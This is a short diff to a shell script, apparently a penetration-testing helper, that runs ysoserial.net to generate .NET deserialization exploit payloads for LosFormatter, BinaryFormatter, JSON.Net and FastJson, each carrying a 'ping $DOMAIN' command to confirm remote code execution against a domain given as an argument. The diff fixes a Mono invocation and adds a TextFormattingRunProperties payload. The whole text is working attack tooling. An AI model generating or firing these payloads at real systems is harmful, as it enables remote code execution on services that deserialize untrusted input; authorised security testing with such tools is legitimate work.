@@ -2,11 +2,13 @@ DOMAIN=$1
 printf "TypeConfuseDelegate w/ LosFormatter\n=====================\n"
 ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping $DOMAIN" -o raw
 printf "\n\nTypeConfuseDelegateMono w/ LosFormatter\n=====================\n"
-ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping $DOMAIN" -o raw
+mono ~/progs/ysoserial.net/ysoserial.exe -g TypeConfuseDelegateMono -f LosFormatter -c "ping $DOMAIN" -o raw
 printf "\n\nTypeConfuseDelegate w/ BinaryFormatter\n=====================\n"
 ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping $DOMAIN"
 printf "\n\nTypeConfuseDelegateMono w/ BinaryFormatter\n=====================\n"
 ysoserial.exe -g TypeConfuseDelegateMono -f BinaryFormatter -c "ping $DOMAIN"
+printf "\n\nTextFormattingRunProperties w/ LosFormatter\n=====================\n"
+ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "ping $DOMAIN" -o raw
 printf "\n\nObjectDataProvider w/ JSON.Net\n=====================\n"
 ysoserial.exe -g ObjectDataProvider -f JSON.Net -c "ping $DOMAIN" -o raw
 printf "\n\nObjectDataProvider w/ FastJson\n=====================\n"
